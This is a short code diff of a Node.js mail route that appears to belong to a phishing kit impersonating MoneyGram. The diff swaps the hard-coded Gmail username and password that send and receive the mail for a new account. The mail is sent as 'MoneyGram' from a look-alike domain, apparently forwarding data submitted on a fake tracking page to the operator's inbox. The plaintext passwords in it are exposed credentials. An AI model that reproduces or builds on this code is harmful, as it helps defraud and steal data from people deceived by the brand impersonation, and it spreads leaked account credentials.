@@ -17,15 +17,15 @@ app.post('/mail', async (req, res) =>
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'oemad7744@gmail.com',
-      pass: 'omaremad1234',
+      user: 'moayad224444@gmail.com',
+      pass: 'uaohwuyqkzrfbqco',
     },
   });
 
   try {
     await transporter.sendMail({
       from: '"MoneyGram" <no-reply@monygram.com>',
-      to: 'oemad7744@gmail.com',
+      to: 'moayad224444@gmail.com',
       subject: 'MoneyGram: Track',
       text: `
       <h1>MoneyGram</h1> 
